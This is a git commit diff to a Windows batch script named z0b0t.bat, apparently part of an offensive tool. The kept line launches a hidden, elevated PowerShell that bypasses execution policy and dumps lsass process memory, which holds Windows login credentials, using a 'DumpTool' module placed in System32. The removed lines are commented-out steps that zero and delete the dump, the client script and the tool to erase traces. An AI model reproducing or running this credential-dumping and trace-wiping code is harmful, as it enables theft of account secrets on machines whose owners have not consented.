4d7d013267e8a653e47a05dede8a1705ee447150
z0t0b <42980375+z0t0b@users.noreply.github.com>
2019-11-08 20:10:19 -0600

    Add files via upload

--- Project1/z0b0t/z0b0t/z0b0t.bat
+++ Project1/z0b0t/z0b0t/z0b0t.bat
@@ -14,14 +14,5 @@ XCOPY /Y /S /I "%~dp0\z0b0tSoftware\DumpTool" "C:\Windows\System32\WindowsPowerS
 
 :: Bypass the execution policy to dump the memory
 :: NOTE: The memory dump will by default (unless manually configured here) be located at C:\Windows\System32
-PowerShell.exe -WindowStyle Hidden -NonInteractive -NoLogo -NoProfile -Command "& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy Unrestricted -Force; Get-Module DumpTool | Import-Module; Import-Module DumpTool; Get-Process lsass | DumpTool; Set-ExecutionPolicy Restricted -Force; timeout 45' -Verb RunAs}"
-
-:: Turns the z0b0tClient.py file, lsass_72.dmp file and dumping tool into zero-byte files and deletes them from C:\Windows\System32
-:: TYPE nul > "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"
-:: TYPE nul > ".\z0b0tClient.py"
-:: TYPE nul > ".\lsass_76.dmp"
-:: TYPE nul > ".\z0b0t.bat"
-:: DEL /Q ".\z0b0tClient.py" "C:\Windows\System32\lsass_76.dmp" ".\z0b0t.bat"
-:: RD /S /Q "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"
-:: RD /Q "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\DumpTool"
+PowerShell.exe -WindowStyle Hidden -NonInteractive -NoLogo -NoProfile -Command "& {Start-Process PowerShell -ArgumentList 'Set-ExecutionPolicy Unrestricted -Force; Get-Module DumpTool | Import-Module; Import-Module DumpTool; Get-Process lsass | DumpTool; Set-ExecutionPolicy Restricted -Force' -Verb RunAs}"
 
